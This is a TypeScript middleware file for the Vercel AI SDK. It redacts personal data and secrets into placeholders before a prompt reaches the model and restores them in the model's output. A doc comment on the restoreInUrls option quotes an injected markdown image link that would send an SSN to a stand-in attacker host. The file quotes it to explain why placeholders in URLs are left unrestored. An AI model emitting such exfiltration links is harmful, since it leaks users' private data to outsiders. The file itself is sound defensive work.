// Vercel AI SDK middleware: the model sees placeholders, your code gets the
// real values back.
//
//   import { wrapLanguageModel } from "ai";
//   import { taintwardMiddleware } from "taintward/ai-sdk";
//
//   const model = wrapLanguageModel({ model: openai("gpt-4.1"), middleware: taintwardMiddleware() });
//
// On the way out every text, reasoning, tool call and tool result in the
// prompt is scanned and sensitive values become <PERSON_1>, <EMAIL_1> ...
// On the way back placeholders are restored in text, reasoning and tool call
// arguments, also when streamed in pieces. File parts are not scanned.

import type {
  LanguageModelV4CallOptions,
  LanguageModelV4Content,
  LanguageModelV4Message,
  LanguageModelV4Middleware,
  LanguageModelV4Prompt,
  LanguageModelV4StreamPart,
} from "@ai-sdk/provider";
import {
  PLACEHOLDER_SOURCE,
  PlaceholderMap,
  PlaceholderRestoreError,
  StreamRestorer,
  instructionFor,
  mergeReports,
  type RestoreReport,
} from "./placeholders.js";
import { redactPayload, redactString } from "./redact.js";

export interface TaintwardMiddlewareOptions {
  /** Send <PERSON_1> style placeholders (default). `false` sends [PII] / [SECRET] masks. */
  placeholders?: boolean;
  /** Add one system line asking the model to copy placeholders exactly (default true). */
  instruction?: boolean;
  /** Throw PlaceholderRestoreError when the answer has placeholders that cannot be restored. */
  strict?: boolean;
  /**
   * Share one map across calls, for example per conversation. By default each
   * call gets a new map; the prompt is redacted again on every call, so the
   * same value gets the same placeholder anyway.
   */
  map?: PlaceholderMap;
  /**
   * Also restore placeholders inside link and image addresses (default false,
   * or TAINTWARD_RESTORE_IN_URLS=1). Off, an injected
   * ![x](https://attacker.example/?d=<SSN_1>) keeps the placeholder instead
   * of carrying the real value out (gap G1). Ignored when `map` is given.
   */
  restoreInUrls?: boolean;
  /**
   * Called after each answer with the placeholder forms the model rewrote
   * (repaired), broke (lost) or invented (unknown), and the ones left inside
   * link addresses (blocked). Never values. By default
   * a warning is printed when something could not be restored.
   */
  onReport?: (report: RestoreReport) => void;
}

const EXACT_G = new RegExp(PLACEHOLDER_SOURCE, "g");

function defaultReport(r: RestoreReport): void {
  if (r.lost.length || r.unknown.length) {
    console.warn(
      `taintward: model answer has placeholders that could not be restored (lost: ${r.lost.slice(0, 5).join(", ")}; unknown: ${r.unknown.slice(0, 5).join(", ")})`,
    );
  }
  if (r.blocked.length) {
    console.warn(`taintward: placeholders inside link addresses were not restored: ${r.blocked.slice(0, 5).join(", ")}`);
  }
}

type Redact = (s: string) => string;
type RedactJson = <T>(v: T) => T;

function redactMessage(msg: LanguageModelV4Message, text: Redact, json: RedactJson): LanguageModelV4Message {
  if (msg.role === "system") return { ...msg, content: text(msg.content) };
  const content = msg.content.map((part) => {
    switch (part.type) {
      case "text":
      case "reasoning":
        return { ...part, text: text(part.text) };
      case "tool-call":
        return { ...part, input: json(part.input) };
      case "tool-result": {
        const o = part.output;
        switch (o.type) {
          case "text":
          case "error-text":
            return { ...part, output: { ...o, value: text(o.value) } };
          case "json":
          case "error-json":
            return { ...part, output: { ...o, value: json(o.value) } };
          case "content":
            return {
              ...part,
              output: { ...o, value: o.value.map((v) => (v.type === "text" ? { ...v, text: text(v.text) } : v)) },
            };
          default:
            return part;
        }
      }
      default:
        return part;
    }
  });
  return { ...msg, content } as LanguageModelV4Message;
}

/** Canonical placeholders written into the prompt, in order. */
function placeholdersIn(prompt: LanguageModelV4Prompt): string[] {
  const seen = new Set<string>();
  for (const m of JSON.stringify(prompt).matchAll(EXACT_G)) seen.add(`<${m[1]!.toUpperCase()}_${parseInt(m[2]!, 10)}>`);
  return [...seen];
}

/** Strings of a tool call input, JSON-decoded so an escaped "<" is seen. */
function inputText(input: string): string[] {
  const t = input.trimStart()[0];
  if (t === "{" || t === "[") {
    try {
      const out: string[] = [];
      JSON.stringify(JSON.parse(input), (_k, v) => {
        if (typeof v === "string") out.push(v);
        return v;
      });
      return out;
    } catch {
      // not JSON: check the raw string
    }
  }
  return [input];
}

/** Create the middleware. Pass it to `wrapLanguageModel` from "ai". */
export function taintwardMiddleware(options: TaintwardMiddlewareOptions = {}): LanguageModelV4Middleware {
  const usePlaceholders = options.placeholders ?? true;
  const useInstruction = options.instruction ?? true;
  const onReport = options.onReport ?? defaultReport;
  const maps = new WeakMap<object, PlaceholderMap>();

  const finish = (map: PlaceholderMap, texts: string[]): void => {
    const report = mergeReports(texts.map((t) => map.diagnose(t)));
    if (options.strict && (report.lost.length || report.unknown.length)) {
      throw new PlaceholderRestoreError(report.lost, report.unknown);
    }
    onReport(report);
  };

  return {
    specificationVersion: "v4",

    transformParams: async ({ params }) => {
      const map = options.map ?? new PlaceholderMap({ restoreInUrls: options.restoreInUrls });
      const opts = usePlaceholders ? { placeholders: map } : {};
      const text: Redact = (s) => redactString(s, "llm", opts);
      const json: RedactJson = (v) => redactPayload(v, "llm", opts);
      let prompt = params.prompt.map((m) => redactMessage(m, text, json));
      const names = usePlaceholders ? placeholdersIn(prompt) : [];
      if (useInstruction && names.length > 0) {
        prompt = [{ role: "system", content: instructionFor(names) }, ...prompt];
      }
      const out: LanguageModelV4CallOptions = { ...params, prompt };
      if (usePlaceholders) maps.set(out, map);
      return out;
    },

    wrapGenerate: async ({ doGenerate, params }) => {
      const result = await doGenerate();
      const map = maps.get(params);
      if (!map || map.size === 0) return result;
      const texts: string[] = [];
      const content = result.content.map((c): LanguageModelV4Content => {
        if (c.type === "text" || c.type === "reasoning") {
          texts.push(c.text);
          return { ...c, text: map.restoreText(c.text) };
        }
        if (c.type === "tool-call") {
          texts.push(...inputText(c.input));
          return { ...c, input: map.restoreText(c.input) };
        }
        return c;
      });
      finish(map, texts);
      return { ...result, content };
    },

    wrapStream: async ({ doStream, params }) => {
      const result = await doStream();
      const map = maps.get(params);
      if (!map || map.size === 0) return result;
      const restorers = new Map<string, StreamRestorer>();
      const raw = new Map<string, string>();
      const texts: string[] = [];
      const restorer = (id: string, mode: "text" | "json") => {
        let r = restorers.get(id);
        if (!r) restorers.set(id, (r = new StreamRestorer(map, mode)));
        return r;
      };
      const endPiece = (id: string): string => {
        const rest = restorers.get(id)?.flush() ?? "";
        restorers.delete(id);
        const t = raw.get(id);
        if (t !== undefined) texts.push(t);
        raw.delete(id);
        return rest;
      };

      const stream = result.stream.pipeThrough(
        new TransformStream<LanguageModelV4StreamPart, LanguageModelV4StreamPart>({
          transform(part, ctrl) {
            switch (part.type) {
              case "text-delta":
              case "reasoning-delta":
              case "tool-input-delta": {
                const key = `${part.type.split("-")[0]}:${part.id}`;
                raw.set(key, (raw.get(key) ?? "") + part.delta);
                const out = restorer(key, part.type === "tool-input-delta" ? "json" : "text").push(part.delta);
                if (out) ctrl.enqueue({ ...part, delta: out });
                return;
              }
              case "text-end":
              case "reasoning-end":
              case "tool-input-end": {
                const key = `${part.type.split("-")[0]}:${part.id}`;
                const rest = endPiece(key);
                if (rest) {
                  const delta = part.type.replace("-end", "-delta") as "text-delta" | "reasoning-delta" | "tool-input-delta";
                  ctrl.enqueue({ type: delta, id: part.id, delta: rest } as LanguageModelV4StreamPart);
                }
                ctrl.enqueue(part);
                return;
              }
              case "tool-call":
                texts.push(...inputText(part.input));
                ctrl.enqueue({ ...part, input: map.restoreText(part.input) });
                return;
              case "finish":
                try {
                  finish(map, texts);
                } catch (e) {
                  ctrl.enqueue({ type: "error", error: e });
                }
                ctrl.enqueue(part);
                return;
              default:
                ctrl.enqueue(part);
            }
          },
        }),
      );
      return { ...result, stream };
    },
  };
}

export { PlaceholderMap, PlaceholderRestoreError, type RestoreReport };
